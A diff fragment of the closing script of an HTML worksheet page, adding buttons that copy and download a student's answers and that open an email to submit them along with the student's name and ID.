+                        content += '<div style="border: 1px solid #ccc; padding: 10px; min-height: 50px; background: #f9f9f9;">' + (answer || '(No answer provided)') + '</div>';
+                        content += '<br>';
+                    });
+                    
+                    content += '</body></html>';
+                    return content;
+                }
+                
+                // Show a temporary feedback message
+                function showFeedback(message, isError = false) {
+                    submitFeedback.textContent = message;
+                    submitFeedback.style.backgroundColor = isError ? 'var(--red)' : 'var(--green)';
+                    submitFeedback.style.color = 'var(--base3)';
+                    submitFeedback.classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        submitFeedback.classList.add('hidden');
+                    }, 3000);
+                }
+
+                // --- "Copy & Download" Button ---
+                copyDownloadBtn.addEventListener('click', () => {
+                    try {
+                        const content = getAllAnswers();
+                        
+                        // 1. Copy to clipboard
+                        navigator.clipboard.writeText(content).then(() => {
+                            // 2. Trigger download
+                            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = 'copied_content.txt';
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            URL.revokeObjectURL(url);
+                            
+                            showFeedback('Answers copied to clipboard and download started!');
+                        }, () => {
+                            showFeedback('Failed to copy to clipboard.', true);
+                        });
+                        
+                    } catch (err) {
+                        console.error('Error in copy/download:', err);
+                        showFeedback('An error occurred.', true);
+                    }
+                });
+
+                // --- "Send Email" Button ---
+                sendEmailBtn.addEventListener('click', () => {
+                    try {
+                        const studentName = studentNameInput.value || 'Unknown Student';
+                        const studentId = studentIdInput.value || 'No ID';
+                        const subject = 'Submission from ' + studentName + ' (' + studentId + ')';
+                        
+                        // Use plain text for the email body.
+                        // HTML bodies can be very long and get blocked by mail clients.
+                        const body = getAllAnswers(); 
+                        
+                        const mailtoLink = 'mailto:asengroa@hotmail.com?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(body);
+                        
+                        // Check if link is too long
+                        if (mailtoLink.length > 2000) {
+                            showFeedback('Answers are too long to send via email. Please use "Copy & Download".', true);
+                        } else {
+                            window.location.href = mailtoLink;
+                        }
+                    } catch (err) {
+                        console.error('Error sending email:', err);
+                        showFeedback('An error occurred while preparing the email.', true);
+                    }
+                });
+
+            });
+        })();
+    </script>
+</body>
+</html>
+
+
+
+
